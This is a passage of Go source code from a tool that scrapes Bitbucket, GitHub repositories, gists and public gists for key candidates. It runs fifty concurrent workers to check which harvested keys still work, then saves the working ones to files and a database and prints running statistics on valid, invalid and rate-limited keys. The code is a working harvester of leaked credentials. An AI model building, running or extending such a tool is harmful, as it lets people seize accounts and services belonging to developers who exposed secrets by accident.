		case queryChan <- scrapeJob{source: "bitbucket", query: q}:
		case <-ctx.Done():
			break
		}
	}
	close(queryChan)

	for _, q := range gistQueries {
		sourceWg.Add(1)
		go func(query string) {
			defer sourceWg.Done()
			scrapeGitHubSearch(ctx, "in:gist "+query, candidateChan)
		}(q)
	}

	for _, repoPath := range repoTargets {
		sourceWg.Add(1)
		go func(path string) {
			defer sourceWg.Done()
			scrapeGitHubRepos(ctx, path, candidateChan)
		}(repoPath)
	}

	sourceWg.Add(1)
	go func() {
		defer sourceWg.Done()
		scrapePublicGists(ctx, candidateChan)
	}()

	go func() {
		sourceWg.Wait()
		close(candidateChan)
		fmt.Println("\033[1;33m[SOURCE SCAN COMPLETE]\033[0m All source fetchers finished")
	}()

	var candWg sync.WaitGroup
	jobChan := make(chan keyRecord, 5000)
	for i := 0; i < 50; i++ {
		candWg.Add(1)
		go func() {
			defer candWg.Done()
			for kr := range jobChan {
				validateKey(ctx, kr, validChan, invalidChan)
			}
		}()
	}
	go func() {
		for kr := range candidateChan {
			atomic.AddInt64(&validatedCount, 1)
			select {
			case jobChan <- kr:
			case <-ctx.Done():
				return
			}
		}
		close(jobChan)
	}()

	statsDone := make(chan struct{})
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				current := atomic.LoadInt64(&validatedCount)
				rate := float64(current) / elapsed * 60
				fmt.Printf("\n\033[1;37m[STATS]\033[0m %.0f min | Rate: %.1f/min | Validated: %d | Valid: %d | Invalid: %d | RateLimit: %d | Errors: %d\n",
					elapsed/60, rate, current, atomic.LoadInt64(&workingCount), atomic.LoadInt64(&invalidCount), atomic.LoadInt64(&rateHitCount), atomic.LoadInt64(&errorCount))
			case <-statsDone:
				return
			}
		}
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\033[1;31m[SHUTDOWN]\033[0m Caught interrupt...")
		cancel()
	}()

	candWg.Wait()
	valWg.Wait()

	closeOnce.Do(func() {
		close(validChan)
		close(invalidChan)
		close(statsDone)
		time.Sleep(1 * time.Second)
		workingFile.Close()
		candidateWriter.Close()
		invalidWriter.Close()
		db.Close()
	})

	exportResults()

	fmt.Printf("\n\033[1;35m[DONE]\033[0m Validated: %d | Valid: %d | Invalid: %d | RateLimit: %d | Errors: %d | Time: %.1f min\n",
		atomic.LoadInt64(&validatedCount), atomic.LoadInt64(&workingCount), atomic.LoadInt64(&invalidCount), atomic.LoadInt64(&rateHitCount), atomic.LoadInt64(&errorCount), time.Since(startTime).Seconds()/60)
}
